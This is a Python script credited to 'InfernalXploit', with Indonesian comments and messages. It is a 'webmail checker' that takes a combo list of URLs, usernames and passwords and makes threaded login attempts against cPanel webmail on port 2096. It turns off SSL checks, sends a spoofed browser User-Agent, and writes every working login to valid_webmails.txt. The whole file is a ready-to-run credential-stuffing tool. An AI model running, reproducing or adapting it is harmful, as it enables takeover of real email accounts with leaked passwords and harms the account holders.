#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Script by InfernalXploit

import os
import requests
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

# Matikan warning SSL
warnings.simplefilter('ignore', InsecureRequestWarning)

# Warna
RED = "\033[31m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""{RED}
██╗███╗   ██╗███████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗     ██╗
██║████╗  ██║██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     ██║
██║██╔██╗ ██║█████╗  █████╗  ██████╔╝██╔██╗ ██║███████║██║     ██║
██║██║╚██╗██║██╔══╝  ██╔══╝  ██╔═══╝ ██║╚██╗██║██╔══██║██║     ██║
██║██║ ╚████║██║     ██║     ██║     ██║ ╚████║██║  ██║███████╗███████╗
╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝     ╚═╝     ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚══════╝
                  {CYAN}WEBMAIL CHECKER - InfernalXploit{RESET}
    """)

def check_webmail(url, username, password):
    if not url.startswith("http"):
        url = "https://" + url
    
    if ":" not in url.split("//")[1]:
        url += ":2096"

    login_url = f"{url}/login/"
    data = {
        'user': username,
        'pass': password,
        'login': 'Login'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }

    try:
        r = requests.post(login_url, data=data, headers=headers, verify=False, timeout=10)
        if "incorrect" in r.text.lower() or "invalid" in r.text.lower():
            return False, f"{RED}❌ Login gagal: {username}:{password}{RESET}"
        elif r.status_code == 200 and ("dashboard" in r.text.lower() or "logout" in r.text.lower()):
            with open("valid_webmails.txt", "a") as f:
                f.write(f"{url}|{username}|{password}\n")
            return True, f"{CYAN}✅ Login berhasil: {username}:{password}{RESET}"
        else:
            return False, f"{RED}❌ Gagal (unknown response) {username}:{password}{RESET}"
    except Exception as e:
        return False, f"{RED}❌ Error {username}:{password} -> {str(e)}{RESET}"

def worker(combo):
    sep = "|" if "|" in combo else ":"
    try:
        url, user, pw = combo.strip().split(sep)
        return check_webmail(url.strip(), user.strip(), pw.strip())
    except:
        return False, f"{RED}❌ Format salah -> {combo}{RESET}"

def main():
    banner()
    file = input(f"{WHITE}Masukkan nama file combo list: {RESET}").strip()
    threads = int(input(f"{WHITE}Masukkan jumlah threads: {RESET}").strip())

    if not os.path.exists(file):
        print(f"{RED}File tidak ditemukan!{RESET}")
        return

    combos = [line.strip() for line in open(file) if line.strip()]
    print(f"{CYAN}Total combo: {len(combos)} | Threads: {threads}{RESET}\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, c) for c in combos]
        for f in as_completed(futures):
            success, msg = f.result()
            print(msg)

    print(f"\n{CYAN}Selesai! Hasil valid tersimpan di valid_webmails.txt{RESET}")

if __name__ == "__main__":
    main()
